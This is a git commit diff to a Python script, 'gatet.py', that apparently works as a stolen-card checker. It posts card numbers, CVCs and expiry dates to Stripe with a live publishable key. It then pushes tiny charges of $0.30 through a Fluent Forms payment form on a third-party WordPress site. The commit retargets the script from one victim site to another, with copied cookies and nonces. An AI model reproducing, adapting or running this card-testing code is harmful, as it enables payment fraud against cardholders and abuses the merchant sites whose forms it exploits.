0573f6b2522783a6bbbaab7183677765f941e6a2
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-03-15 14:43:37 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -26,25 +26,27 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F8d64b7a725%3B+stripe-js-v3%2F8d64b7a725%3B+card-element&key=pk_live_51NuxgqC2AneYDXKanLwvYl8Cspp79OFUOiSjXh38AqvWODESU2pYey4w2tzLkj7gHMTZBqkDY5SRvxrMVZgyu8GD00ZWMYr5HX'
 	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
+	headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': 'b1eb7380-a220-49f1-a30d-b53b4d1058e8733906',
-	    '__stripe_sid': 'e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
+	    '__wpdm_client': '40dc402560dbc364ff472137d506278a',
+	    '__stripe_mid': 'ddd711e0-6ff4-434a-81c9-c10af46980e535950a',
+	    '__stripe_sid': 'dbbadced-d0b1-4bf8-971f-0ce9242ad9cfab71af',
 	}
 	
 	headers = {
-	    'authority': 'narhspartnerschools.com',
+	    'authority': 'www.thelegacyforge.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=b1eb7380-a220-49f1-a30d-b53b4d1058e8733906; __stripe_sid=e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
-	    'origin': 'https://narhspartnerschools.com',
-	    'referer': 'https://narhspartnerschools.com/parent-portal/',
+	    # 'cookie': '__wpdm_client=40dc402560dbc364ff472137d506278a; __stripe_mid=ddd711e0-6ff4-434a-81c9-c10af46980e535950a; __stripe_sid=dbbadced-d0b1-4bf8-971f-0ce9242ad9cfab71af',
+	    'origin': 'https://www.thelegacyforge.com',
+	    'referer': 'https://www.thelegacyforge.com/norflein/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -56,17 +58,17 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1741932002037',
+	    't': '1742023960281',
 	}
 	
 	data = {
-	    'data': '__fluent_form_embded_post_id=1140&_fluentform_9_fluentformnonce=ad1e2cf5dc&_wp_http_referer=%2Fparent-portal%2F&dropdown=&repeater_field%5B0%5D%5B%5D=&repeater_field%5B0%5D%5B%5D=2024-2025&names%5Bfirst_name%5D=&names%5Blast_name%5D=&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'data': 'item_6__fluent_sf=&__fluent_form_embded_post_id=16581&_fluentform_6_fluentformnonce=191ea14186&_wp_http_referer=%2Fnorflein%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&email=&lcfgcoupon=&custom-payment-amount=0.30&payment_method=stripe&__ff_all_applied_coupons=&input_radio=&__stripe_payment_method_id='+str(pm)+'',
 	    'action': 'fluentform_submit',
-	    'form_id': '9',
+	    'form_id': '6',
 	}
 	
 	r2 = requests.post(
-	    'https://narhspartnerschools.com/wp-admin/admin-ajax.php',
+	    'https://www.thelegacyforge.com/wp-admin/admin-ajax.php',
 	    params=params,
 	    cookies=cookies,
 	    headers=headers,
